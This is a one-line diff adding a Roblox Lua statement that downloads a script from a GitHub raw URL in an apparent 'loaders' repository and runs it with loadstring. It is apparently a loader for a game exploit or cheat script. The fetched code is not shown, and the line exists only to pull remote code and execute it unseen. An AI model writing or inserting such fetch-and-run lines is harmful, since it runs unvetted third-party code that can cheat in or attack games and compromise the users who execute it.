@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/runaways-beta-spam0-caqn1a2yl328si.lua"))()
